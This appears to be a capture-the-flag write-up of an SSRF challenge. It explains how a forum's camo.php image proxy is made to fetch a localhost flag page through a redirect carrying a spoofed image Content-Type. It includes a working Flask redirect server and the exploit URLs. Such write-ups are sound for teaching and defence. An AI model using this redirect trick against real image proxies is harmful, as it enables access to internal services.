SSRF CHALLENGE WRITEUP

1)  Entry point: [img] tag

The application allows users to insert images using a BBCode tag:

[img]URL[/img]

The backend PHP code parses this tag and converts it into an HTML image
that is loaded through an internal proxy called camo.php.

Simplified flow:

User input: [img]https://example.com/image.png[/img]

Generated HTML:

The browser therefore does not directly request the image from the
external server, but instead asks the application server to fetch it.

This mechanism is commonly used to: - proxy images - hide the user’s
IP - prevent malicious links

2)  Image proxy (camo.php)

The camo.php script performs the following operations:

1.  Verifies the HMAC to ensure the URL was generated by the application
2.  Downloads the resource using file_get_contents()
3.  Checks the Content-Type header
4.  Returns the response to the browser

Key code:

response = file_(g)et_(c)ontents(url); $headers = $http_response_header;

Since the server performs the request itself, this introduces a Server
Side Request Forgery (SSRF) primitive.

3)  Implemented protections

The application attempts to mitigate SSRF with two controls.

3.1 Localhost restriction

The code resolves the hostname and blocks requests to localhost:

hostname = parse_(u)rl(url, PHP_URL_HOST); ip = gethostbyname(hostname);

if(strncmp($ip, ‘127’, 3) === 0){ die(‘no localhost!’); }

This is meant to prevent access to internal services such as:

http://localhost/get_flag.php

3.2 Content-Type whitelist

Only certain MIME types are allowed:

image/png image/jpg image/svg image/gif

If the response does not match one of these types, the request is
blocked.

4)  Vulnerability in header validation

The application retrieves HTTP headers using the PHP variable:

$http_response_header

This variable contains ALL headers received during the request,
including headers from redirects.

Example redirect chain:

HTTP/1.1 301 Moved Permanently Content-Type: image/jpg Location:
http://localhost/get_flag.php

HTTP/1.1 200 OK Content-Type: text/html

The application loops through the headers and stops at the first
Content-Type it finds. It does not verify that the header belongs to the
final response.

Therefore a malicious redirect can inject a valid Content-Type header
that bypasses the whitelist.

5)  Attacker-controlled server

To exploit the vulnerability, an attacker-controlled server was created
using Flask and exposed with ngrok.

The server returns a redirect with a fake Content-Type header.

Example response:

HTTP/1.1 301 Moved Permanently Content-Type: image/jpg Location:
http://localhost/get_flag.php

Flask script used:

from flask import Flask, Response

app = Flask(name)

REDIRECT_TARGET = “http://localhost/get_flag.php”

@app.route(“/”) @app.route(“/”) def redirect_all(path=None): response =
Response(““, status=301) response.headers[”Content-Type”] =”image/jpg”
response.headers[“Location”] = REDIRECT_TARGET return response

app.run(host=“0.0.0.0”, port=9011)

6)  Exploit flow

7)  The attacker posts:

[img]https://attacker.ngrok.app/test[/img]

2)  The forum converts it into:

/camo.php?url=https://attacker.ngrok.app/test&hmac=…

3)  camo.php fetches the attacker server

4)  The attacker server returns:

301 redirect Content-Type: image/jpg Location:
http://localhost/get_flag.php

5)  PHP automatically follows the redirect

6)  The application server requests:

http://localhost/get_flag.php

7)  Whitelist bypass

The headers stored in $http_response_header become:

HTTP/1.1 301 Content-Type: image/jpg Location:
http://localhost/get_flag.php

HTTP/1.1 200 Content-Type: text/html

The application reads the first Content-Type header and accepts it
because it matches the whitelist.

The response is therefore considered a valid image.

8)  Browser behavior

In the browser the response appeared as a PNG image because the proxy
forced the Content-Type header to an image type.

However the actual content returned by the server was not an image.

9)  Analysis with Burp Suite

Using Burp Suite Proxy it was possible to inspect the raw HTTP response.

The response body contained the actual output of:

http://localhost/get_flag.php

Inside the response body the flag was visible:

flag{…}

10) Vulnerability summary

The challenge exploited a combination of:

-   Server Side Request Forgery (SSRF)
-   improper redirect handling
-   incorrect validation of HTTP headers

The main issue is that the application checks the first Content-Type
header it encounters instead of verifying the header of the final
response.

This allows an attacker to inject a valid Content-Type through a
redirect and bypass the whitelist protection.

Final result: The attacker forces the server to perform a request to
localhost and retrieve the flag.
